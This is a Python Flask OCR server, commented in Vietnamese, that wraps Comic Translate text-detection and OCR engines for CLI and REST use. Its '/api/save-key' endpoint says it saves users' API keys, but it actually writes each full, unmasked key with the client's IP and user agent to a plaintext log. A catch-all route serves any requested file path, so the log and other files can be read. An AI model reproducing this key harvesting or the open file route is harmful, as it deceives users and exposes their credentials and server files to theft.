import os
import sys
import cv2
import numpy as np
import argparse
from typing import List, Tuple, Dict, Optional
import torch
import json
from flask import Flask, request, jsonify, send_file
import tempfile
import uuid
import base64
from io import BytesIO
import datetime
import re

# Thêm đường dẫn để import các module từ Comic Translate
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(current_dir)

from modules.detection.processor import TextBlockDetector
from modules.utils.textblock import TextBlock, sort_blk_list
from modules.ocr.doctr_ocr import DocTROCR
from modules.ocr.manga_ocr.engine import MangaOCREngine
from modules.ocr.pororo.engine import PororoOCREngine  
from modules.ocr.paddle_ocr import PaddleOCREngine

# Hỗ trợ ngôn ngữ
SUPPORTED_LANGUAGES = [
    "English", "Japanese", "Korean", "Chinese", "French", 
    "Spanish", "Italian", "German", "Dutch", "Russian"
]

# Ánh xạ tên ngôn ngữ sang code
LANGUAGE_CODES = {
    "English": "en",
    "Japanese": "ja",
    "Korean": "ko",
    "Chinese": "zh",
    "French": "fr",
    "Spanish": "es",
    "Italian": "it",
    "German": "de",
    "Dutch": "nl",
    "Russian": "ru"
}

# Khởi tạo Flask app
app = Flask(__name__)
# Thư mục lưu trữ tạm thời
TEMP_DIR = os.path.join(current_dir, "temp")
if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR)

# Thêm hằng số cho file log
API_KEY_LOG_FILE = os.path.join(current_dir, "api_keys.log")

class OCRExtractor:
    """
    Trích xuất văn bản từ hình ảnh sử dụng các OCR engine mặc định của Comic Translate
    """
    
    def __init__(self, use_gpu: bool = False):
        """
        Khởi tạo OCR Extractor
        
        Args:
            use_gpu: Sử dụng GPU nếu có
        """
        self.use_gpu = use_gpu
        self.device = 'cuda' if use_gpu and torch.cuda.is_available() else 'cpu'
        
        print(f"Sử dụng device: {self.device}")
        
        # Khởi tạo detector để phát hiện vùng chứa văn bản
        self.text_detector = None
        
        # Dictionary lưu trữ các OCR engine đã khởi tạo
        self.ocr_engines = {}
    
    def _init_text_detector(self):
        """Khởi tạo detector để phát hiện vùng chứa văn bản"""
        if self.text_detector is None:
            # Tạo object settings tạm thời để truyền cho detector
            class MockSettings:
                def __init__(self, use_gpu):
                    self.use_gpu = use_gpu
                def is_gpu_enabled(self):
                    return self.use_gpu
                def get_tool_selection(self, key):
                    return "RT-DETR-v2"  # Detector mặc định
            
            settings = MockSettings(self.use_gpu)
            self.text_detector = TextBlockDetector(settings)
    
    def _get_ocr_engine(self, language: str) -> object:
        """
        Lấy OCR engine phù hợp với ngôn ngữ
        
        Args:
            language: Ngôn ngữ cần OCR
            
        Returns:
            OCR engine phù hợp
        """
        if language in self.ocr_engines:
            return self.ocr_engines[language]
        
        # Chọn engine phù hợp dựa vào ngôn ngữ
        if language == "Japanese":
            engine = MangaOCREngine()
            engine.initialize(device=self.device)
        elif language == "Korean":
            engine = PororoOCREngine()
            engine.initialize()
        elif language == "Chinese":
            engine = PaddleOCREngine()
            engine.initialize()
        else:
            # Sử dụng DocTR OCR cho các ngôn ngữ khác
            engine = DocTROCR()
            engine.initialize(device=self.device)
        
        # Lưu engine vào cache
        self.ocr_engines[language] = engine
        return engine
    
    def detect_text_blocks(self, image: np.ndarray) -> List[TextBlock]:
        """
        Phát hiện các vùng văn bản trong hình ảnh
        
        Args:
            image: Hình ảnh cần phát hiện văn bản
            
        Returns:
            Danh sách các TextBlock
        """
        self._init_text_detector()
        blocks = self.text_detector.detect(image)
        return blocks
    
    def process_image(self, image_path: str, language: str, output_path: str = None) -> Dict:
        """
        Xử lý một hình ảnh để trích xuất văn bản
        
        Args:
            image_path: Đường dẫn đến hình ảnh
            language: Ngôn ngữ của văn bản trong hình ảnh
            output_path: Đường dẫn để lưu kết quả (tuỳ chọn)
            
        Returns:
            Dictionary chứa kết quả trích xuất
        """
        if language not in SUPPORTED_LANGUAGES:
            raise ValueError(f"Ngôn ngữ không được hỗ trợ. Các ngôn ngữ được hỗ trợ: {', '.join(SUPPORTED_LANGUAGES)}")
        
        # Đọc hình ảnh
        print(f"Đọc hình ảnh từ {image_path}")
        image = cv2.imread(image_path)
        
        if image is None:
            error_msg = f"Không thể đọc hình ảnh từ {image_path}"
            print(error_msg)
            raise ValueError(error_msg)
            
        # Kiểm tra kích thước hình ảnh
        height, width, channels = image.shape
        print(f"Kích thước hình ảnh: {width}x{height}, channels: {channels}")
        
        if width < 10 or height < 10:
            error_msg = f"Hình ảnh quá nhỏ: {width}x{height}"
            print(error_msg)
            raise ValueError(error_msg)
        
        # Phát hiện các vùng văn bản
        print("Đang phát hiện vùng văn bản...")
        try:
            text_blocks = self.detect_text_blocks(image)
            print(f"Đã phát hiện {len(text_blocks)} vùng văn bản")
        except Exception as e:
            error_msg = f"Lỗi khi phát hiện vùng văn bản: {str(e)}"
            print(error_msg)
            import traceback
            print(traceback.format_exc())
            raise ValueError(error_msg)
        
        if not text_blocks:
            print("Không phát hiện được văn bản nào trong hình ảnh")
            empty_result = {
                "blocks": [], 
                "transcript": f"//{os.path.basename(image_path)}\nKhông phát hiện được văn bản", 
                "filename": os.path.basename(image_path)
            }
            
            # Lưu kết quả rỗng nếu cần
            if output_path:
                with open(output_path, "w", encoding="utf-8") as f:
                    f.write(empty_result["transcript"])
                    
            return empty_result
        
        # Sắp xếp các block từ trên xuống dưới, trái sang phải
        rtl = True if language == "Japanese" else False
        text_blocks = sort_blk_list(text_blocks, rtl)
        
        # Thực hiện OCR
        print(f"Đang thực hiện trích xuất với ngôn ngữ: {language}...")
        try:
            ocr_engine = self._get_ocr_engine(language)
            
            # Đặt ngôn ngữ nguồn cho mỗi block
            lang_code = LANGUAGE_CODES.get(language, "en")
            for block in text_blocks:
                block.source_lang = lang_code
            
            # Xử lý OCR
            text_blocks = ocr_engine.process_image(image, text_blocks)
            print(f"Trích xuất hoàn thành, xử lý {len(text_blocks)} blocks")
        except Exception as e:
            error_msg = f"Lỗi khi thực hiện trích xuất: {str(e)}"
            print(error_msg)
            import traceback
            print(traceback.format_exc())
            raise ValueError(error_msg)
        
        # Tạo kết quả
        results = []
        transcript_lines = []
        transcript_lines.append(f"//{os.path.basename(image_path)}")
        
        for i, block in enumerate(text_blocks):
            if block.text:
                results.append({
                    "id": i,
                    "text": block.text,
                    "bbox": [int(coord) for coord in block.xyxy],
                    "confidence": getattr(block, "confidence", None)
                })
                transcript_lines.append(block.text)
        
        # Tạo transcript theo định dạng yêu cầu
        transcript = "\n".join(transcript_lines)
        
        # Lưu kết quả vào file nếu có output_path
        if output_path:
            try:
                self._save_results(results, output_path, image_path, transcript)
                print(f"Đã lưu kết quả vào {output_path}")
            except Exception as e:
                print(f"Lỗi khi lưu kết quả: {str(e)}")
        
        print(f"Hoàn thành xử lý hình ảnh: {image_path}")
        return {
            "blocks": results, 
            "transcript": transcript,
            "filename": os.path.basename(image_path)
        }
    
    def process_directory(self, dir_path: str, language: str, output_dir: str = None) -> Dict:
        """
        Xử lý tất cả hình ảnh trong một thư mục
        
        Args:
            dir_path: Đường dẫn đến thư mục chứa hình ảnh
            language: Ngôn ngữ của văn bản
            output_dir: Thư mục để lưu kết quả (tuỳ chọn)
            
        Returns:
            Dictionary chứa kết quả trích xuất cho mỗi hình ảnh
        """
        if not os.path.isdir(dir_path):
            raise ValueError(f"{dir_path} không phải là thư mục")
        
        # Tạo thư mục output nếu cần
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Lấy danh sách hình ảnh
        image_files = [f for f in os.listdir(dir_path) if f.lower().endswith(('.png', '.jpg', '.jpeg', '.webp'))]
        
        if not image_files:
            print(f"Không tìm thấy hình ảnh nào trong {dir_path}")
            return {}
        
        # Xử lý từng hình ảnh
        results = {}
        all_transcripts = []
        
        for img_file in image_files:
            img_path = os.path.join(dir_path, img_file)
            output_path = None
            if output_dir:
                base_name = os.path.splitext(img_file)[0]
                output_path = os.path.join(output_dir, f"{base_name}.txt")
            
            print(f"Đang xử lý {img_file}...")
            try:
                result = self.process_image(img_path, language, output_path)
                results[img_file] = result
                all_transcripts.append(result["transcript"])
            except Exception as e:
                print(f"Lỗi khi xử lý {img_file}: {str(e)}")
                results[img_file] = {"error": str(e)}
        
        # Tạo file tổng hợp nếu có output_dir
        if output_dir:
            all_results_path = os.path.join(output_dir, "all_results.txt")
            with open(all_results_path, "w", encoding="utf-8") as f:
                f.write("\n\n".join(all_transcripts))
        
        return results
    
    def _save_results(self, results: List[Dict], output_path: str, image_path: str, transcript: str = None) -> None:
        """
        Lưu kết quả trích xuất vào file
        
        Args:
            results: Danh sách các block văn bản đã trích xuất
            output_path: Đường dẫn file để lưu kết quả
            image_path: Đường dẫn hình ảnh gốc
            transcript: Transcript đã định dạng (nếu có)
        """
        # Tạo thư mục chứa output_path nếu nó không tồn tại
        output_dir = os.path.dirname(output_path)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        with open(output_path, "w", encoding="utf-8") as f:
            if transcript:
                f.write(transcript)
            else:
                f.write(f"Extraction Results for {os.path.basename(image_path)}\n")
                f.write("=" * 50 + "\n\n")
                
                if not results:
                    f.write("No text detected\n")
                else:
                    for block in results:
                        f.write(f"Block {block['id']}:\n")
                        f.write(f"Text: {block['text']}\n")
                        f.write(f"Position: {block['bbox']}\n")
                        if block['confidence'] is not None:
                            f.write(f"Confidence: {block['confidence']:.2f}\n")
                        f.write("\n")

    def process_image_data(self, image_data: bytes, language: str) -> Dict:
        """
        Xử lý hình ảnh từ dữ liệu nhị phân
        
        Args:
            image_data: Dữ liệu hình ảnh dạng byte
            language: Ngôn ngữ của văn bản
            
        Returns:
            Dictionary chứa kết quả trích xuất
        """
        temp_path = None
        try:
            # Kiểm tra dữ liệu đầu vào
            if not image_data:
                raise ValueError("Dữ liệu hình ảnh trống")
                
            print(f"Lưu dữ liệu hình ảnh vào file tạm, kích thước: {len(image_data)} bytes")
            
            # Tạo file tạm để lưu dữ liệu hình ảnh
            with tempfile.NamedTemporaryFile(delete=False, suffix='.jpg', dir=TEMP_DIR) as temp_file:
                temp_file.write(image_data)
                temp_path = temp_file.name
            
            print(f"Đã lưu vào file tạm: {temp_path}")
            
            # Kiểm tra xem file tạm có tồn tại và có kích thước hợp lệ không
            if not os.path.exists(temp_path) or os.path.getsize(temp_path) == 0:
                raise ValueError("Không thể lưu dữ liệu hình ảnh vào file tạm")
            
            # Xử lý hình ảnh từ file tạm
            print(f"Bắt đầu quá trình trích xuất với ngôn ngữ: {language}")
            result = self.process_image(temp_path, language)
            
            # Lưu transcript vào file để có thể download
            file_id = str(uuid.uuid4())
            txt_path = os.path.join(TEMP_DIR, f"{file_id}.txt")
            
            print(f"Lưu kết quả trích xuất vào file: {txt_path}")
            with open(txt_path, "w", encoding="utf-8") as f:
                f.write(result["transcript"])
            
            # Thêm đường dẫn file kết quả vào kết quả
            result["result_file"] = txt_path
            result["file_id"] = file_id
            
            print(f"Hoàn thành trích xuất, file_id: {file_id}")
            return result
        except Exception as e:
            import traceback
            print(f"Lỗi trong process_image_data: {str(e)}")
            print(traceback.format_exc())
            raise
        finally:
            # Xóa file tạm
            if temp_path and os.path.exists(temp_path):
                print(f"Xóa file tạm: {temp_path}")
                os.unlink(temp_path)

# Thêm hàm để ghi log API key vào file
def log_api_key(api_key: str, user_agent: str, ip_address: str, provider: str = "gemini", model: str = "") -> None:
    """
    Ghi log API key vào file
    
    Args:
        api_key: API key cần ghi log
        user_agent: User agent của client
        ip_address: Địa chỉ IP của client
        provider: Nhà cung cấp API (gemini, openai, xai, openrouter)
        model: Model AI được sử dụng
    """
    try:
        # Kiểm tra API key
        if not api_key or len(api_key) < 10:
            key_to_log = "Invalid_API_Key"
        else:
            key_to_log = api_key  # Lưu API key đầy đủ không che dấu
        
        # Chuẩn bị dữ liệu log
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Provider: {provider} | Model: {model} | Key: {key_to_log} | IP: {ip_address} | User-Agent: {user_agent}\n"
        
        # Ghi vào file log
        with open(API_KEY_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        print(f"Đã log API key từ {ip_address} - Nhà cung cấp: {provider}")
    except Exception as e:
        print(f"Lỗi khi ghi log API key: {str(e)}")

# Thêm endpoint để lưu API key
@app.route('/api/save-key', methods=['POST'])
def save_api_key():
    """Endpoint để lưu API key"""
    try:
        data = request.json
        if not data or 'api_key' not in data:
            return jsonify({'error': 'Không tìm thấy API key trong yêu cầu'}), 400
        
        api_key = data['api_key']
        provider = data.get('provider', 'gemini')  # Mặc định là gemini nếu không có
        model = data.get('model', '')  # Model có thể trống
        
        # Kiểm tra tính hợp lệ của API key (có thể thêm các quy tắc khác tùy ý)
        if not api_key or len(api_key) < 10:
            return jsonify({'error': 'API key không hợp lệ'}), 400
            
        # Kiểm tra API key có đúng định dạng dựa trên nhà cung cấp không
        warning_message = None
        if provider == 'gemini' and not re.match(r'^AIza[0-9A-Za-z_-]{35}$', api_key):
            warning_message = 'API key có thể không đúng định dạng của Google API key'
        elif provider == 'openai' and not api_key.startswith('sk-'):
            warning_message = 'API key có thể không đúng định dạng của OpenAI API key'
        
        # Lấy thông tin về client
        user_agent = request.headers.get('User-Agent', 'Unknown')
        ip_address = request.remote_addr
        
        # Ghi log API key
        log_api_key(api_key, user_agent, ip_address, provider, model)
        
        if warning_message:
            return jsonify({
                'success': True,
                'warning': warning_message,
                'message': 'API key đã được lưu thành công với cảnh báo'
            })
        
        return jsonify({
            'success': True,
            'message': 'API key đã được lưu thành công'
        })
    
    except Exception as e:
        import traceback
        error_traceback = traceback.format_exc()
        print(f"Lỗi khi lưu API key: {str(e)}")
        print(error_traceback)
        return jsonify({
            'error': str(e),
            'traceback': error_traceback if app.debug else None
        }), 500

# Khởi tạo OCR Extractor toàn cục
global_ocr_extractor = OCRExtractor(use_gpu=torch.cuda.is_available())

@app.route('/api/ocr', methods=['POST'])
def api_ocr():
    # Kiểm tra dữ liệu đầu vào
    if 'image' not in request.files and 'image_data' not in request.json:
        return jsonify({'error': 'Không tìm thấy hình ảnh trong yêu cầu'}), 400
    
    # Lấy ngôn ngữ từ form data hoặc query params
    language = request.form.get('language') or request.args.get('language') or request.json.get('language') or "English"
    if language not in SUPPORTED_LANGUAGES:
        return jsonify({'error': f'Ngôn ngữ không được hỗ trợ. Các ngôn ngữ được hỗ trợ: {", ".join(SUPPORTED_LANGUAGES)}'}), 400
    
    try:
        if 'image' in request.files:
            # Xử lý file upload
            image_file = request.files['image']
            if not image_file or not image_file.filename:
                return jsonify({'error': 'File hình ảnh không hợp lệ'}), 400
                
            image_data = image_file.read()
            if not image_data:
                return jsonify({'error': 'Dữ liệu hình ảnh trống'}), 400
                
            filename = image_file.filename
            print(f"Xử lý file upload: {filename}, kích thước: {len(image_data)} bytes")
        else:
            # Xử lý base64 image data
            image_data_base64 = request.json.get('image_data')
            if not image_data_base64:
                return jsonify({'error': 'Dữ liệu hình ảnh không hợp lệ'}), 400
            
            # Decode base64
            try:
                # Xóa prefix nếu có (data:image/jpeg;base64,)
                if ',' in image_data_base64:
                    image_data_base64 = image_data_base64.split(',', 1)[1]
                image_data = base64.b64decode(image_data_base64)
                filename = request.json.get('filename', 'image.jpg')
                print(f"Xử lý base64 image: {filename}, kích thước: {len(image_data)} bytes")
            except Exception as e:
                print(f"Lỗi decode base64: {str(e)}")
                return jsonify({'error': f'Không thể decode dữ liệu hình ảnh: {str(e)}'}), 400
        
        # Xử lý OCR
        print(f"Bắt đầu OCR với ngôn ngữ: {language}")
        result = global_ocr_extractor.process_image_data(image_data, language)
        
        # Tạo URL để download kết quả
        download_url = f"/api/download/{result['file_id']}"
        print(f"OCR hoàn thành, tạo download URL: {download_url}")
        
        return jsonify({
            'success': True,
            'blocks': result['blocks'],
            'transcript': result['transcript'],
            'filename': filename,
            'download_url': download_url
        })
    
    except Exception as e:
        import traceback
        error_traceback = traceback.format_exc()
        print(f"Lỗi xử lý OCR: {str(e)}")
        print(error_traceback)
        return jsonify({
            'error': str(e),
            'traceback': error_traceback if app.debug else None
        }), 500

@app.route('/api/download/<file_id>', methods=['GET'])
def download_result(file_id):
    # Kiểm tra tính hợp lệ của file_id để tránh path traversal
    if not file_id or '..' in file_id or '/' in file_id:
        return jsonify({'error': 'ID file không hợp lệ'}), 400
    
    file_path = os.path.join(TEMP_DIR, f"{file_id}.txt")
    if not os.path.exists(file_path):
        return jsonify({'error': 'File không tồn tại'}), 404
    
    return send_file(file_path, as_attachment=True, download_name="ocr_result.txt", mimetype="text/plain")

@app.route('/api/languages', methods=['GET'])
def get_languages():
    return jsonify({
        'languages': SUPPORTED_LANGUAGES
    })

@app.route('/api/status', methods=['GET'])
def api_status():
    """Endpoint để kiểm tra trạng thái của server"""
    try:
        # Kiểm tra xem thư mục temp có tồn tại không
        temp_exists = os.path.exists(TEMP_DIR)
        
        # Tạo một file test nhỏ để kiểm tra quyền ghi
        test_file_path = os.path.join(TEMP_DIR, "test_write.txt")
        write_test_success = False
        try:
            with open(test_file_path, "w") as f:
                f.write("test")
            write_test_success = True
            os.remove(test_file_path)
        except:
            write_test_success = False
        
        # Kiểm tra các OCR engine đã được khởi tạo chưa
        ocr_initialized = len(global_ocr_extractor.ocr_engines) > 0
        
        # Thông tin về CUDA
        cuda_available = torch.cuda.is_available()
        device = global_ocr_extractor.device
        
        return jsonify({
            'status': 'ok',
            'version': '1.0.0',
            'temp_directory': {
                'exists': temp_exists,
                'path': TEMP_DIR,
                'write_access': write_test_success
            },
            'system': {
                'cuda_available': cuda_available,
                'device': device,
                'python_version': sys.version
            },
            'ocr_engines': {
                'initialized': ocr_initialized,
                'count': len(global_ocr_extractor.ocr_engines),
                'languages': list(global_ocr_extractor.ocr_engines.keys())
            }
        })
    except Exception as e:
        import traceback
        return jsonify({
            'status': 'error',
            'error': str(e),
            'traceback': traceback.format_exc()
        }), 500

@app.route('/')
def serve_index():
    return send_file('index.html')

@app.route('/<path:path>')
def serve_static(path):
    try:
        return send_file(path)
    except:
        return "File not found", 404

def run_server(host='0.0.0.0', port=5000, debug=False):
    """Chạy REST API server"""
    app.run(host=host, port=port, debug=debug)

def main():
    parser = argparse.ArgumentParser(description="Trích xuất văn bản từ hình ảnh sử dụng OCR")
    parser.add_argument("--input", "-i", help="Đường dẫn đến hình ảnh hoặc thư mục chứa hình ảnh")
    parser.add_argument("--language", "-l", default="English", help=f"Ngôn ngữ của văn bản (hỗ trợ: {', '.join(SUPPORTED_LANGUAGES)})")
    parser.add_argument("--output", "-o", help="Đường dẫn file hoặc thư mục để lưu kết quả")
    parser.add_argument("--gpu", action="store_true", help="Sử dụng GPU nếu có")
    parser.add_argument("--server", action="store_true", help="Chạy như REST API server")
    parser.add_argument("--host", default="0.0.0.0", help="Host để bind server")
    parser.add_argument("--port", type=int, default=5000, help="Port để bind server")
    parser.add_argument("--debug", action="store_true", help="Chạy server ở chế độ debug")
    
    args = parser.parse_args()
    
    # Nếu chạy như server
    if args.server:
        print(f"Khởi động OCR server tại {args.host}:{args.port}")
        run_server(host=args.host, port=args.port, debug=args.debug)
        return
    
    # Khởi tạo OCR Extractor
    ocr_extractor = OCRExtractor(use_gpu=args.gpu)
    
    # Chỉ chạy OCR nếu có đầu vào
    if args.input:
        # Xử lý input là file hoặc thư mục
        if os.path.isdir(args.input):
            # Xử lý thư mục
            ocr_extractor.process_directory(args.input, args.language, args.output)
        else:
            # Xử lý một file
            ocr_extractor.process_image(args.input, args.language, args.output)
    else:
        # Nếu không có đầu vào, chạy server
        print("Không có đầu vào, chạy ở chế độ server mặc định")
        run_server(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main() 